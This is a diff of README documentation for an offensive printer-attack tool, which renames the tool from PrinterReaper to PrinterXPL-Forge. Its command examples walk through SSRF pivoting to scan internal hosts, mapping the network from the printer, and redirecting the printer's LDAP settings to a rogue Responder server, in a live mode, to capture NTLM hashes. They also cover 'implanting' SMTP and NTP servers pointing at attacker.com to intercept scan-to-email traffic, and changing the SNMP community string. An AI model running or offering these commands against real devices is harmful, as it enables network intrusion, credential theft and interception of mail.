@@ -10,16 +10,16 @@ The `--pivot` flag detects SSRF vectors by sending IPP and WSD print requests po
 
 ```bash
 # Detect SSRF vectors and enumerate reachable internal hosts
-python printer-reaper.py 192.168.1.100 --pivot
+python printerxpl-forge.py 192.168.1.100 --pivot
 
 # Port-scan a specific internal host via printer SSRF
-python printer-reaper.py 192.168.1.100 --pivot-scan 10.0.0.1
-python printer-reaper.py 192.168.1.100 --pivot-scan 192.168.1.1
-python printer-reaper.py 192.168.1.100 --pivot-scan 172.16.0.10
+python printerxpl-forge.py 192.168.1.100 --pivot-scan 10.0.0.1
+python printerxpl-forge.py 192.168.1.100 --pivot-scan 192.168.1.1
+python printerxpl-forge.py 192.168.1.100 --pivot-scan 172.16.0.10
 ```
 
 **How it works:**
-1. PrinterReaper sends an IPP `Print-Job` request with the job URI pointing to an internal IP (e.g. `ipp://10.0.0.1/ipp`)
+1. PrinterXPL-Forge sends an IPP `Print-Job` request with the job URI pointing to an internal IP (e.g. `ipp://10.0.0.1/ipp`)
 2. The printer's IPP implementation will attempt to connect to that IP
 3. Differences in response time and error codes reveal whether the internal host is reachable from the printer's network segment
 4. WSD uses the same technique via the `wsd:Print` operation
@@ -47,7 +47,7 @@ python printer-reaper.py 192.168.1.100 --pivot-scan 172.16.0.10
 Build a complete map of the network from the printer's vantage point.
 
 ```bash
-python printer-reaper.py 192.168.1.100 --network-map
+python printerxpl-forge.py 192.168.1.100 --network-map
 ```
 
 **Data sources used:**
@@ -105,11 +105,11 @@ NETWORK MAP — from 192.168.1.100 (EPSON L3250) perspective
 
 ## LDAP/AD NTLM Hash Capture
 
-Many enterprise printers are configured to authenticate against Active Directory via LDAP for scan-to-email and address book lookups. PrinterReaper exploits this by redirecting the printer's LDAP server configuration to a rogue LDAP server (Responder), capturing the machine account NTLM hash.
+Many enterprise printers are configured to authenticate against Active Directory via LDAP for scan-to-email and address book lookups. PrinterXPL-Forge exploits this by redirecting the printer's LDAP server configuration to a rogue LDAP server (Responder), capturing the machine account NTLM hash.
 
 ```bash
 # Step 1 — Check if printer has LDAP integration configured
-python printer-reaper.py 192.168.1.100 --xpl-check research-ldap-hash-capture
+python printerxpl-forge.py 192.168.1.100 --xpl-check research-ldap-hash-capture
 
 # Output (if vulnerable):
 # [+] VULNERABLE: LDAP server configured at ldap.company.internal
@@ -121,10 +121,10 @@ python printer-reaper.py 192.168.1.100 --xpl-check research-ldap-hash-capture
 # (listens on port 389 for LDAP, captures NTLM hashes)
 
 # Step 3 — Redirect printer's LDAP config to attacker IP (dry-run shows payload)
-python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture
+python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture
 
 # Step 4 — Live: redirect to rogue LDAP server
-python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
+python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
 # (prompts for rogue server IP)
 
 # Step 5 — When the printer next triggers an LDAP lookup (scan job, address book):
@@ -144,16 +144,16 @@ Change printer's server configuration to persist access or redirect traffic:
 
 ```bash
 # Change SMTP relay (intercept all scan-to-email traffic)
-python printer-reaper.py 192.168.1.100 --implant smtp_host=attacker.com
+python printerxpl-forge.py 192.168.1.100 --implant smtp_host=attacker.com
 
 # Change DNS server
-python printer-reaper.py 192.168.1.100 --implant dns=8.8.8.8
+python printerxpl-forge.py 192.168.1.100 --implant dns=8.8.8.8
 
 # Change SNMP community string
-python printer-reaper.py 192.168.1.100 --implant snmp_community=hacked
+python printerxpl-forge.py 192.168.1.100 --implant snmp_community=hacked
 
 # Change NTP server (time-based attacks)
-python printer-reaper.py 192.168.1.100 --implant ntp=attacker.com
+python printerxpl-forge.py 192.168.1.100 --implant ntp=attacker.com
 ```
 
 ---
